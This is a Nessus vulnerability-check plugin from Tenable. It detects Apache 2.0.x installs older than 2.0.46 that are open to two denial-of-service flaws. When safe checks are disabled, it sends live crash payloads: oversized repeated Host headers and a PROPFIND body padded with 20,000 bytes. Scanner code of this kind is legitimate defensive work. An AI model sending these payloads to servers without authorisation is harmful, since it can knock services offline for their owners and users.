#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

# Ref:
#  Date: Wed, 28 May 2003 12:29:03 -0400 (EDT)
#  From: Apache HTTP Server Project <jwoolley@apache.org>
#  To: <bugtraq@securityfocus.com>
#  Subject: [SECURITY] [ANNOUNCE] Apache 2.0.46 released

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(11665);
  script_version("1.40");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2003-0189", "CVE-2003-0245");
  script_bugtraq_id(7723, 7725);
  script_xref(name:"RHSA", value:"2003:186-01");

  script_name(english:"Apache 2.0.x < 2.0.46 Multiple DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple denial of service
vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running a version of Apache 2.0.x that
is prior to 2.0.46. It is, therefore, affected by multiple denial of
service vulnerabilities :

  - There is a denial of service vulnerability that may 
    allow an attacker to disable basic authentication on 
    this host.

  - There is a denial of service vulnerability in the 
    mod_dav module that may allow an attacker to crash this 
    service remotely.");
  script_set_attribute(attribute:"see_also", value:"https://archive.apache.org/dist/httpd/CHANGES_2.0");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.0.46 or later.");
  script_set_cvss_base_vector("CVSS2#AV:L/AC:M/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2003/05/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/05/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:http_server");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2003-2022 Tenable Network Security, Inc.");

  script_dependencies("no404.nasl", "apache_http_version.nasl");
  script_require_keys("installed_sw/Apache");
  script_require_ports("Services/www", 80);

  exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("audit.inc");
include("install_func.inc");

get_install_count(app_name:"Apache", exit_if_zero:TRUE);
port = get_http_port(default:80);
install = get_single_install(app_name:"Apache", port:port, exit_if_unknown_ver:TRUE);

if (safe_checks())
{
  # Check if we could get a version first, then check if it was
  # backported
  version = get_kb_item_or_exit('www/apache/'+port+'/version', exit_code:1);
  backported = get_kb_item_or_exit('www/apache/'+port+'/backported', exit_code:1);

  if (report_paranoia < 2 && backported) audit(AUDIT_BACKPORT_SERVICE, port, "Apache");
  source = get_kb_item_or_exit('www/apache/'+port+'/source', exit_code:1);

  # Check if the version looks like iether ServerTokens Major/Minor
  # was used
  if (version =~ '^2(\\.0)?$') exit(1, "The banner from the Apache server listening on port "+port+" - "+source+" - is not granular enough to make a determination.");
  if (version !~ "^\d+(\.\d+)*$") exit(1, "The version of Apache listening on port " + port + " - " + version + " - is non-numeric and, therefore, cannot be used to make a determination.");
  if (version =~ '^2\\.0' && ver_compare(ver:version, fix:'2.0.46') == -1)
  {
    if (report_verbosity > 0)
    {
      report = 
        '\n  Version source    : ' + source + 
        '\n  Installed version : ' + version +
        '\n  Fixed version     : 2.0.46\n';
      security_note(port:port, extra:report);
    }
    else security_note(port);
    exit(0);
  }
  else audit(AUDIT_LISTEN_NOT_VULN, "Apache", port, install["version"]);
}
else
{
  #
  # I could not make these exploits to work (RH8.0), but we'll include them
  # anyway.
  #
  if(http_is_dead(port:port))exit(0);

  req = 'GET / HTTP/1.1\r\n';
  for(i=0;i<10;i++)
   req = strcat(req, 'Host: ', crap(2000), '\r\n');
  req += '\r\n';

  # The new API does not allow us to set the same header several times
  r = http_send_recv_buf(port: port, data: req);

  if (http_is_dead(port: port, retry: 3))
  {
   security_note(port);
   exit(0);
  }

  xml = '<?xml version="1.0"?>\r\n' + 
        '<a:propfind xmlns:a="' + 'DAV:' + crap(20000) + '">\r\n' +
        '    <a:allprop/>\r\n' +
        '</a:propfind>';
     
  r = http_send_recv3(port: port, method: 'PROPFIND', item: '/', data: xml,
    add_headers: make_array( 'Depth', '1',
                             'Content-Type', 'text/xml; charset="utf-8"') );
  if (http_is_dead(port: port, retry: 3)) security_note(port);
}
